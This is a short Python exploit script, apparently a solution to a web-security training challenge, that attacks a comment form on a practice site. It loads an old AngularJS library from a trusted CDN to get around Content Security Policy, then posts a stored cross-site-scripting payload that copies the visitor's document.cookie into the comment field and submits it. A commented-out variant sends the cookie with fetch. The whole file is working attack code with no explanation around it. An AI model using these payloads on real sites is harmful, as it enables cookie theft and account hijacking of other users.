import requests
import random
import string

url = "https://csp.training.jinblack.it"

def gen_ran_str(size=15):
	return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

s = requests.Session()

r = s.post(url, data={
	'title': gen_ran_str(),
	'location': gen_ran_str(),
	'description': gen_ran_str(),
	'proposals': gen_ran_str()})

new_url = r.url

r = s.post(new_url, data={
	"name": gen_ran_str(),
	"comment": "<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js'></script>"})


#r = s.post(new_url, data={
#	"name": gen_ran_str(),
#	#"comment": '<div ng-app ng-csp>{{$eval.constructor(\'fetch("%s", {"method": "POST", "body": {"name": "%s", "comment": document.cookie }})\')()}}</div>' % (new_url, gen_ran_str())})
#	"comment": '<div ng-app ng-csp>{{$eval.constructor(\'fetch("%s")\')()}}</div>' % new_url })
#
r = s.post(new_url, data={
	"name": gen_ran_str(),
	"comment": '''<div ng-app ng-csp>{{$eval.constructor(\'
		document.querySelector("#name").value = "wow!";
		document.querySelector("#comment").value = document.cookie;
		document.querySelector("body > div > small > form > button:nth-child(2)").click();
		\')()}}</div>'''})

print(r.url)
